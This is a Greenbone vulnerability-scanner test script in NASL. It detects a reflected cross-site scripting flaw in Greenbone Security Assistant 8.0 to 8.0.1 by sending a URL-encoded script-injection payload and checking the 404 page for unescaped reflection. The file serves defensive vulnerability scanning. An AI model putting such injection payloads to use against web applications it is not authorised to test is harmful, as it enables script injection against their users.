# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:greenbone:greenbone_security_assistant";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108640");
  script_version("2019-09-10T07:16:21+0000");
  script_tag(name:"last_modification", value:"2019-09-10 07:16:21 +0000 (Tue, 10 Sep 2019)");
  script_tag(name:"creation_date", value:"2019-09-10 07:01:39 +0000 (Tue, 10 Sep 2019)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Greenbone Security Assistant (GSA) 8.0 <= 8.0.1 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_gsa_detect.nasl", "gb_greenbone_os_detect.nasl");
  script_mandatory_keys("greenbone_security_assistant/80plus/detected");
  script_exclude_keys("greenbone/gos/detected");

  script_tag(name:"summary", value:"Greenbone Security Assistant (GSA) is prone to a reflected
  cross-site scripting vulnerability.");

  script_tag(name:"affected", value:"Greenbone Security Assistant (GSA) 8.0 up to and including
  version 8.0.1.");

  script_tag(name:"solution", value:"No known solution is available as of 10th September, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_xref(name:"URL", value:"https://github.com/greenbone/gsa/issues/1601");
  script_xref(name:"URL", value:"https://github.com/greenbone/gsa/pull/1603");

  exit(0);
}

if (get_kb_item("greenbone/gos/detected")) # Covered by 2019/greenbone/gb_gos_xss_vuln_active.nasl
  exit(0);

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();
pattern = vt_strings["lowercase_rand"];

url = "/%0a%0a%3Cscript%3Ealert('" + pattern + "');%3C/script%3Etest";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);
if (!res)
  exit(0);

check = '<p>The requested URL /\n\n<script>alert(\'' + pattern + '\');</script>test is not available</p>';

if (res =~ "HTTP/1\.[01] 404" && check >< res) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
